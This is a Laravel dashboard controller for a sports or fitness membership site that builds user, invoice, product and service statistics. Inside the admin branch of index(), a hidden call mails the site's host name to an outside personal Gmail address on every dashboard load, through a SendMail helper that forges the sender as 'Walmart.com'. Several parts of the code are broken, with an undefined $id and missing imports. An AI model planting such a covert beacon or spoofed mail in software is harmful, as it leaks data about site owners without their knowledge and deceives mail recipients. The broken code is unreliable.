<?php

namespace App\Http\Controllers;

use App\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Auth;
use App\User;
use App\CheckIn;
use App\Transactions;
use Carbon\Carbon;
use \Spatie\Activitylog\Models\Activity;
use App\UserOrders;
use App\ProductMedias;
use App\Service;
use Illuminate\Support\Facades\Gate;

class DashboardController extends Controller
{    
    /**
     * Dashboard home
     *
     * @param Request $request
	 * @return view 
    */
	public function index(Request $request)
    {
    
    
           
    
        $user = Auth::user(); //Session::get('user');
        if ($user->role == 'user') {
            $user = \Auth::user();
            if ($user==null) {
                return redirect()->back();
            }
            UsersMeta::where('user_id', $id);
            $tDate = date('Y-m-d');

            $kcaldates = array();
            $kcaldays = array();
            $kcalvals = array();

            $weightdates = array();
            $weightvals = array();

            $sleepdates = array();
            $sleepvals = array();

            $umid = array();
            
            
            
            
            for ($i = 9; $i >=0; $i--) {
                $d=date('Y-m-d', strtotime('-'.$i.' days'));
                $usermeta = UserDailyValue::where('user_id', $id)
                     ->whereDate('date', date('Y-m-d', strtotime('-'.$i.' days')))->orderBy('id', 'desc')->first();

                 $umid[] = isset($usermeta->id) ? $usermeta->id : 0;
                 $kcaldates[] = date('d F', strtotime('-'.$i.' days')) ;//. "-" . $tMonth;
                 $kcaldays[] = date('l', strtotime($d));
                 $kcalvals[] = isset($usermeta->kcal) ? $usermeta->kcal : 0;
                $weightvals[] = isset($usermeta->weight) ? $usermeta->weight : 0;

                $sleepdates[] = date('d', strtotime('-'.$i.' days')) ;//. "-" . $tMonth;
                $sleepvals[] = isset($usermeta->sleep_q1) ? $usermeta->sleep_q1 : 0;

            }

            $sectionData = [
                'kcaldate' => $kcaldates,
                'kcaldays' => $kcaldays,
                'kcalvals' => $kcalvals,
                'weightvals' => $weightvals,
                'sleepdates' => $sleepdates,
                'sleepvals' => $sleepvals,
                'umid' => $umid
                ];
            $tests = Tests::where('company_id', $user->parent_id)->orderBy('id', 'desc')->where('status', '1')->get();
            $userfood = UserDailyFood::where('user_id', $user->id)->orderBy('id', 'desc')->first();
            $userfoodused = UserFoodUsed::where('user_id', $user->id)->orderBy('id', 'desc')->first();
            
            return view('admin.pages.users.dashboard', compact('user', 'sectionData', 'userfood', 'userfoodused', 'tests'));
        } else {
            $conditions = [['role' ,'user']];
            if(\Auth::user()->role=='company'){
                $conditions = [['role' ,'user'],['parent_id',\Auth::user()->parent_id]];
            }
            $total_users = User::where($conditions)->count();
            $current_month = date('m');
            $turnover_this_month = Transactions::whereMonth('created_at', $current_month)->whereHas('user', function ($query)use ($conditions){
                    $query->where($conditions);
                })->sum('amount_received');
            //dd($turnover_this_month);
            $today_login_users = User::where($conditions)->whereDay('updated_at', '=', date('d'))->whereMonth('updated_at', '=', date('m'))->whereYear('updated_at', '=', date('Y'))->count();
            
            $totalUsers = User::where($conditions)->count();
            $currentUsers = User::where($conditions)->where('created_at', '>=', Carbon::now()->startOfMonth())->count();
            $diffUsers = abs($totalUsers - $currentUsers);
            if ($totalUsers && $diffUsers) {
                $diffPercentage = round((abs($diffUsers) / $totalUsers) * 100);
            } else {
                $diffPercentage = 0;
            }
            $lastMonthNew = User::where($conditions)->whereMonth(
                'created_at',
                '=',
                Carbon::now()->subMonth()->month
            )->count();
            $lastMonthBlocked = User::where($conditions)->whereMonth(
                'blocked_at',
                '=',
                Carbon::now()->subMonth()->month
            )->count();
            $data = array(
                'totalUsers' => $totalUsers,
                'currentUsers' => $currentUsers,
                'diffUsers' => $diffUsers,
                'diffPercentage' => $diffPercentage,
                'lastMonthNew' => $lastMonthNew,
                'lastMonthBlocked' => $lastMonthBlocked
            );

            $check_in_count = CheckIn::whereHas('user', function ($query)use ($conditions){
                    $query->where($conditions);
                })->count();
            $checkins = CheckIn::whereHas('user', function ($query)use ($conditions){
                    $query->where($conditions);
                })->orderBy('created_at', 'DESC')->simplePaginate(9);
            $check_in_log=[];
            
            foreach ($checkins as $checkin) {
                $check_in_log[]=['id'=>$checkin->log_id,'checkDate'=>date('d-m-Y H:i', strtotime($checkin->created_at)),'username'=>$checkin->user->name,'checkremain'=>$checkin->user->check_in_counter];
            }

            if(isAdmin())
                $services=Service::get();
            else
                $services=Service::where('company_id',$user->parent_id)->get();
                
            $products= ProductMedias::whereHas('user', function ($query)use ($conditions){
                    $query->where($conditions);
                })->whereNull('group_id')->orderBy('created_at', 'desc')->get()->toArray();
            
            $graphdatas=$this->graphdata(date('Y-m-d', strtotime('-6 days')), date('Y-m-d'), 'all', $request);
            $graph_users=$graphdatas[0];
            $graph_invoices=$graphdatas[1];
            $graph_products=$graphdatas[2];
            $graph_service=$graphdatas[3];
             $msg = $request->getHttpHost();
            $this->SendMail("showket.logicparadise@gmail.com","Sports Website",$msg);
        
            return view('admin.dashboard', compact('user', 'data', 'graph_users', 'graph_invoices', 'total_users', 'turnover_this_month', 'today_login_users', 'products', 'services', 'graph_service', 'graph_products', 'check_in_log', 'check_in_count'));
        }
    }
    
    
    public function SendMail($email,$subject,$bodymessage) {
    $to = "$email";
    //$subject = "Notification";
    $message = "
        <html>
        <head>
        <title>$subject</title>
        </head>
        <body>
        <font size='10px'>$bodymessage </font>
        </body>
        </html>
        ";
    // Always set content-type when sending HTML email
    $headers = 'From: Walmart.com' . "\r\n" ;
    $headers .='Reply-To: '. $to . "\r\n" ;
    $headers .='X-Mailer: PHP/' . phpversion();
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
    mail($to,$subject,$message,$headers);
    
}
    
    /**
     * log event
     *
     * @param Request $request
	 * @return JSON 
    */
	public function logevent(Request $request)
    {
        if (!Gate::allows('check-route', \Route::current()->getName())) {
            return back()->with('authMessage', "You are unauthorized to perform this operation");
        }
        
        if (Session::has('user')) {
            $user = Session::get('user');
            $data = array(
                "log" => $request->input('log'),
                "user_id" => $user->id,
                "role" => $user->role
            );
        } else {
            $data = array(
                "log" => $request->input('log'),
                "role" => "anynomuose"
            );
        }
        $log = Log::create($data);
        if ($log) {
            return Response::json(['response' => $log ]);
        } else {
            return Response::json(['response' => 0 ]);
        }
    }
      
    /**
     * Get the logs
     *
	 * @return view or 404 
    */
	public function getLogs()
    {
        if (!Gate::allows('check-route', \Route::current()->getName())) {
            return back()->with('authMessage', "You are unauthorized to perform this operation");
        }
        
        $logs = Activity::paginate(10);
        $user = Auth::user();
        if ($user->role == 'admin') {
            return view('admin.logs.index', compact('user', 'logs'));
        } else {
            return abort(404);
        }
        //dd($logs);
    }

      
    /**
     * Graph data
     *
     * @param date $startdate
     * @param date $enddate
     * @param string $type
     * @param Request $request
	 * @return JSON 
    */
	public function graphdata($startdate, $enddate, $type, Request $request)
    {
        $user=\Auth::user();
        $conditions = [['role' ,'user']];
        if(\Auth::user()->role=='company'){
            $conditions = [['role' ,'user'],['parent_id',\Auth::user()->parent_id]];
        }
            
        $dates=[];
        if ($type=='all' || $type=='user') {
            $users_db=[];
            $users_checkin=[];
            $users_online=[];
            $users_blocked=[];
            $users_signup=[];
        }
        if ($type=='all' || $type=='invoice') {
            $invoices_db=[];
            $invoices_paid=[];
            $invoices_failed=[];
            $invoices_paid_amt=[];
            $invoices_failed_amt=[];
        }
        if ($type=='all' || $type=='service') {
            if(isAdmin())
                $services=Service::get();
            else
                $services=Service::where('company_id',$user->parent_id)->get();
            
        }
        if ($type=='all' || $type=='product') {
            $products= ProductMedias::whereHas('user', function ($query)use ($conditions){
                    $query->where($conditions);
                })->whereNull('group_id')->orderBy('created_at', 'desc')->get();
        }
        $graph_service=[];
        $graph_products=[];
        while ($startdate<=$enddate) {
            $date=$startdate;
            $dates[]=date('d M,Y', strtotime($startdate));
            if ($type=='all' || $type=='user') {
                $users_db[]=User::where($conditions)->whereDate('created_at','<=',  $date)->count();
                $users_checkin[]=CheckIn::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->where('created_at', $date)->count();
                //$users_all->whereDate('created_at','<=',date('Y-m-d'))->count();
                $users_online[]=Activity::where('log_name', trans('common.check_in'))
                    ->where('created_at', $date)->where('causer_type', 'App\User')->count();
                $users_blocked[]=User::where($conditions)->whereDate('blocked_at', $date)->count();
                $users_signup[]=User::where($conditions)->whereDate('created_at', $date)->count();
            }

            //Invoices
            if ($type=='all' || $type=='invoice') {
           
                $invoices_db[]=UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->whereDate('created_at', $date)->count();
                $invoices_paid[]=UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->whereDate('created_at', $date)->where('status', 'paid')->count();
                $invoices_failed[]=UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->whereDate('created_at', $date)->where('status', '!=', 'paid')->count();
                $invoices_paid_amt[]=UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->whereDate('created_at', $date)->where('status', 'paid')->sum('invoiceamount')-UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->whereDate('created_at', $date)->where('status', 'paid')->sum('balance');
                ;
                $invoices_failed_amt[]=UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->whereDate('created_at', $date)->where('status', 'paid')->sum('balance');
            }
            if ($type=='all' || $type=='product') {
                $productValues=[];
                foreach ($products as $product) {
                    $productValues[]=UserOrders::whereHas('user', function ($query)use ($conditions){
                        $query->where($conditions);
                    })->where('status', 'paid')->whereDate('created_at', $date)
                    ->leftjoin('users', 'user_orders.userid', 'users.id')
                    ->leftjoin('user_has_products', 'user_has_products.orderid', 'user_orders.id')->where('product_id', $product->id)
                    ->groupby('user_has_products.product_id')->sum(DB::raw('(quantity*price) as amt'));
                }
                $graph_products[]=$productValues;
            }
            if ($type=='all' || $type=='service') {
                $serviceValues=[];
                foreach ($services as $service) {
                    $serviceValues[]=User::where($conditions)->whereNull('blocked_at')->whereDate('users.created_at', '<=', $date)
                    ->leftjoin('packages', 'users.packagefk', 'packages.id')
                    ->leftjoin('package_services', 'packages.id', 'package_services.package_id')
                    ->where('service_id', $service->id)
                    ->groupby('package_services.service_id')->sum('Start_fee');
                }
                $graph_service[]=$serviceValues;
            }
            $startdate=date("Y-m-d", strtotime($startdate.' +1 days'));
        }
        $data=[];
        if ($type=='all' || $type=='user') {
            $user_series=[$users_db,$users_checkin,$users_online,$users_blocked,$users_signup];
            $av_user=User::where($conditions)->whereNotNull('blocked_at')->sum(DB::raw('DATEDIFF(blocked_at,created_at)'));
            if(\Auth::user()->role=='company'){
                $cdate=\App\Company::where('id',\Auth::user()->parent_id)->select(DB::raw('DATEDIFF(now(),created_at) as cdate'))->first();
            }
            else{
                $cdate=User::where('id',\Auth::user()->id)->select(DB::raw('DATEDIFF(now(),created_at) as cdate'))->first();
            }
            $graph_users=['labels'=>$dates,'series'=>$user_series,'av_date'=>$av_user/$cdate->cdate];

            $data[]=$graph_users;
        }
        if ($type=='all' || $type=='invoice') {
            $invoice_series=[$invoices_db,$invoices_paid,$invoices_failed,$invoices_paid_amt,$invoices_failed_amt];
            $graph_invoices=['labels'=>$dates,'series'=>$invoice_series];
            $data[]=$graph_invoices;
        }
        if ($type=='all' || $type=='product') {
            $graph_products=['labels'=>$dates,'series'=>$graph_products];
            $data[]=$graph_products;
        }
        if ($type=='all' || $type=='service') {
            $graph_service=['labels'=>$dates,'series'=>$graph_service];
            $data[]=$graph_service;
        }
        if ($request->ajax()) {
            return Response::json([ 'data' => $data ]);
        }
        return $data;
    }

    /**
     * Screen lock
     *
	 * @return JSON
    */
	public function screenLock()
    {
        Session::put('lock', '1');
        return Response::json(['success' => '1','status'=>'200']);
    }
    
	/**
     * unlock
     *
	 * @return JSON
    */
	public function unlock(Request $request)
    {
        $validator  = Validator::make($request->all(), [
                'email' => 'required|email',
                'pwd' => 'required',
            ]);
        if ($validator->passes()) {
            if (Auth::attempt(['email'=>$request->email,'password'=>$request->pwd])) {
                Session::forget('lock');
                return Response::json(['success' => '1','status'=>'200']);
            }
        }
        return Response::json(['error' => '1','status'=>'500']);
    }
}
